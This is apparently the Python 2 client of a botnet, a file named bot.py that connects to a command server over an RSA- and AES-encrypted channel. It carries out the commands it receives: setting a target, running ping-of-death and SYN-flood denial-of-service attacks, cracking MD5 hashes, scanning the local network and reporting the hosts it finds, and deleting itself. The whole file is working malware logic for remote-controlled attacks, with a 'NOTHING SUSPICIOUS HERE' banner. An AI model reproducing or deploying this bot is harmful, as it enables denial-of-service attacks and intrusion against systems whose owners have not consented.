import rsa
import socket
import select
import string
import sys
import random
import os
from Crypto.Cipher import AES
import base64
import itertools

# BOT MODULES #######################
from md5_bruteforce import *
from POD import *
from SYN import *
from recon_updated import *

#####################################

#from dummylib import POD, SYN, CRACK, RECON, KILL 

# for fancy ui ######################
from colorama import init
from termcolor import cprint
from pyfiglet import figlet_format
init(strip=not sys.stdout.isatty()) # strp colors if stdout is redir.
#####################################
'''
PROCESS_COMMAND FUNCTION
------------------------
(description)

- will process commands to determine if it is to:
	[1] initiate a DOS attacl
		- it will need a target address and port.
		- need a duration of attack.
		- need a specified accack method that is supported.
		
			current supported attacks:
	
		- will return xxxATT200 or xxxATT500 code to server once done so server knows which bots are done.
	
	[2] initiate parallelized task
		- will receive task goal from server.
		- will return result of task to server with special code PARTAS200 or PARTAS500.

	[3] perform recon technique
		- will attempt to scan LAN.
		- will return list of active hosts appended to RECONT200 code. otherwise RECONT500.
	
	[4] will kill itself
		- will delete itself from host machine after returning IAMDED200 code. If fail it will return IAMDED500 to server.
'''

def process_command(c):
	print "processing command <{}>...".format(c)
	global TARGET
	'''
	SUPPORTS:
		SETTAR100 <IP>
		DOSPOD100
		DOSSYN100
		CRACKR100 <HVAL> <LOWERBOUND> <UPPERBOUND>
		KILLUR100
		RECONR100	
	'''
	c_tok = c.split(" ")
	
	if c_tok[0] == 'SETTAR100':
		if len(c_tok) < 2:
			print "[-] ERROR: EXPECTED TARGET VALUE FOR TARGET COMMAND."
			encrypt_and_send(client_socket, "SETTAR500")	
			return -1
		TARGET = c_tok[1]
		encrypt_and_send(client_socket, "SETTAR200")	
		return 1
	
	if c_tok[0] == 'DOSPOD100':
		stat = POD(TARGET, POD_BYTES)
		if stat == 1:
			encrypt_and_send(client_socket, "DOSPOD200")
		else:
			encrypt_and_send(client_socket, "DOSPOD500")		
		return stat
	
	if c_tok[0] == 'DOSSYN100':
		stat = syn_flood(TARGET, SYN_PACKS)
		if stat == 1:
			encrypt_and_send(client_socket, "DOSSYN200")
		else:
			encrypt_and_send(client_socket, "DOSSYN500")		
		return stat
	
	if c_tok[0] == 'CRACKR100':
		stat = crack(c_tok[1], c_tok[2], c_tok[3])
		if stat != '':
			encrypt_and_send(client_socket, "CRACKR200 " + str(stat))
			return 1
		else:
			encrypt_and_send(client_socket, "CRACKR500")		
			return -1
	
	if c_tok[0] == 'KILLUR100':
		stat = os.remove("bot.py")
		encrypt_and_send(client_socket, "IAMDED200")
		sys.exit()
		#encrypt_and_send(client_socket, "IAMDED500")		
		return -1

	if c_tok[0] == 'RECONR100':
		stat = recon()
		if stat != '':
			encrypt_and_send(client_socket, "RECONR200 " + str(stat))
		else:
			encrypt_and_send(client_socket, "CRACKR500")		
		return -1
	
	else:
		print "[-] ERROR: unrecognized command."
		return -1		
'''
WRAPPER ENCRYPT/DECRYPT FUNCTIONS <HELPER>
----------------------------------
help with encryption and decryption using assets from rsa.py
'''


def encrypt(message, pub_key):
	#en_message = message.encode('utf8')
	en_message = rsa.encrypt(message, pub_key)
	return en_message

def decrypt(message, pri_key):
	de_message = rsa.decrypt(message, pri_key)
	return de_message

# pad16 function used for AES encryption
def pad16(m):
	i = 1    
	diff = 0
	while (len(m) > 16*i):
		i += 1
	diff = (i*16)-len(m)
	return m + diff*'@'

def depad16(m):
	m = m.split('@')
	#m = filter(None, m)
	if len(m) > 1:
		m = ''.join(m[0:-1])
	else:
		m = m[0]
	return m


def encrypt_and_send(sock, message):
	m = pad16(message)
	m1 = 'E'+ base64.b64encode( en_object.encrypt(m) )
	if DEBUG:
		print "sending message [{}] of length: {}".format(m1, len(m1))
	sock.send( m1 )

'''
MAIN FUNCTION
--------------

> main funciton. Follows:
__________________________________________________________________

(NEED TO UPDATE)

(2) if (1) decides AES, apropriate objects from pyCrypto lib are
	created for encryption and decryption using
	"randomly" created shared key and IV using os.urandom()

(3) create client socket (to communicate with server).
	connect to server.

(4) expect and receive server public RSA key. Store.

(5) depending on (1), send server either client public key or
	shared key and IV (using RSA encryption with server public key)

	- when sending either key, a special message forrmat is used:
	
		for RSA public keys we use format:
		
		PUBKEY200 (value of n) (value of e)

		for AES shared secret we use format:
	
		AESKEY200 { (KEY)@!delim!@(IV) }_SERVER PUB_KEY

		note here the format is plaintext "AESKEY200"
		followed by the key and IV separated by a special
		delimiter (@!delim!@) encrypted using the server public key.

(6) begin actively servicing messages from server (while loop):

	(6a) create list of possible file descriptors to read from:
		[sys.stdin, client_socket]
	
	(6b) use select() to determine what has data to read.
		(i)  if sys.stdin then we are sending a message ot the server.
		(ii) if client_socket then we have received a message.
	
	in the case of (i) we prepend an 'E' to the message read from
	stdin and encrypt using method established by (1).
	use socket.send() to send message.
	Note if using AES we must also base64 encode the ciphertext.

	in the case of (ii) we check for empty data (and exit).
	if data is not empty we check to see if there is a prepended
	'E' character. If so we use the decyption method corresponding
	to what was decided in (1). We decrypt everything after the 'E'
	and display that to the user.
	If no 'E' is present we just display the data to the user without
	decryption.
'''
if __name__=="__main__":
	# PARSE command line arguments
	DEBUG = 0

	TARGET = 'NAN'
	
	POD_BYTES = 10
	SYN_PACKS = 10

	WLIST_NAME = 'wordlist.txt'
	

	NO_ENCRYPTION = 0
	if len(sys.argv) < 3:
		print 'error, usage is of form:\n\tpython bot.py hostname/IP port'
		sys.exit()
	if len(sys.argv) == 4:
		if sys.argv[3] == "NO_ENCRYPTION":
			NO_ENCRYPTION = 1
	HOST = sys.argv[1]
	PORT = int(sys.argv[2])
	IN_BUFFER = 16384
	#KEY_SIZE = 1024
	#client_public, client_private = generate_key_pair(KEY_SIZE)
	GOTPUBKEY = 0
	SENTAES = 0
	# ask user if AES should be used.
	USE_AES = 0
	if not NO_ENCRYPTION:
		response = 'y'
	else:
		response = 'n'

	if (response == 'y'):
		USE_AES 	= 1
		key256		= os.urandom(32)
		iv			= os.urandom(16) # 16 byte IV
		en_object	= AES.new(key256, AES.MODE_CBC, iv)
		de_object	= AES.new(key256, AES.MODE_CBC, iv)


	client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client_socket.settimeout(4)
	
	# sanity check
	if DEBUG and USE_AES:
		test 	= 'dog'
		entest 	= en_object.encrypt(pad16(test))
		detest	= de_object.decrypt(entest)
		print "detest type: {}".format(type(detest))
		print "SANITY CHECK: [{}] ENCRYPTS TO [{}]".format(test, entest)
		print "which decrypts to [{}]".format(detest)	
	##


	# ATTEMPT TO CONNECT TO SERVER
	try:
		print "[*] attempting to connect to {} at port {}... ".format(HOST,PORT)
		client_socket.connect((HOST, PORT))
	except:
		print "[-] connection attempt failed. exiting..."
		sys.exit()
	
	print "[+] connected to remote host {} at port {}.".format(HOST, PORT)
	
	######################################################################
	# GET SERVER PUBLIC KEY.
	data = client_socket.recv(IN_BUFFER)
	data_tok = data.split(' ')
	if data_tok[0] == 'PUBKEY200':
		n_server = long(data_tok[1])
		e_server = int(data_tok[2])
		server_public = rsa.PublicKey(n_server, e_server)
		print '[*] received server public key.'
		GOTPUBKEY = 1
	else:
		print "ERROR: (unexpected) did not receive public key from server."
		client_socket.close()
		sys.exit()

	
	# SEND KEY TO SERVER
	print '[*] SENDING KEY TO SERVER.'	

	if USE_AES and GOTPUBKEY:
		#sys.stdin.readline()
		print "[*] sending AES shared secret using RSA encryption."
		message = 'AESKEY200 '+ base64.b64encode(encrypt(key256, server_public))+ ' ' + base64.b64encode(encrypt(iv, server_public))
		if DEBUG:
			print 'sending: [{}]'.format(message)
		client_socket.send(message)
		#SENTAES = 1
		#sys.stdin.readline()


	######################################################################
	print "****************************************************************"
	print "================================================================"
	cprint(figlet_format('NOTHING SUSPICIOUS\n  HERE\n', font='speed'), 'magenta', attrs=['bold'])
	print "================================================================"
	print "****************************************************************"


	#print "--------------------------------------------\n{}\n--------------------------------------------\n".format(welcome_messages[random.randint(0, len(welcome_messages)-1 )])
	
	
	sys.stdin.flush()
	
	while True:
		command = 'NAN'
		stat = 0
		socket_list = [client_socket]
		# use select to get readable sockets.
		read_socket, write_socket, error_socket = select.select(socket_list, [], [])

		for socc in read_socket:
			# case [1] user receives brodcast from server.
			# display inbound messages from server (i.e. broadcasted)
			if socc == client_socket:
				data = socc.recv(IN_BUFFER)
				if not data:
					if DEBUG:
						print "NOT DATA in {} with data [{}]".format(socc.fileno(), data)
					print "\n[*] connection closed--disconnected from not-suspicious server."
					sys.exit()
				else:
					print "[*] got a task."
					'''
					- here anything received that is not encrypted is to be written to stout.
					- commands will be encrypted,
					'''
					data_tok = data.split(' ')

					if data[0] != 'E':
						sys.stdout.write(data)
					else:
						#command = 'NAN' # null command
						if USE_AES:
							command = depad16( de_object.decrypt( base64.b64decode(data[1:]) ) ) 
							if DEBUG:
								print "[*] received command: <{}>".format(command) 
					if command != 'NAN':
						stat = process_command(command)
					print "[*] completed task with code {}".format(stat)
									
			'''
			#THIS SECTION IS FOR IF STDIN SUPPORT IS DESIRED. CURRENTLY NOT IMPLMENTED (no reason to)
			
			# case [2] bot submitted message.
			# outbound requires encryption (implemented)
			else:

				# case [2] enctryption here
				message = sys.stdin.readline()

				if NO_ENCRYPTION:
					client_socket.send(message)

				elif USE_AES:
					message = pad16(message)
					m1 = 'E'+ base64.b64encode( en_object.encrypt(message) )
					if DEBUG:
						print "sending message [{}] of length: {}".format(m1, len(m1))
					client_socket.send( m1 )

				else:
					client_socket.send( 'E'+encrypt(message, server_public) )
				prompt_display()
			'''

	
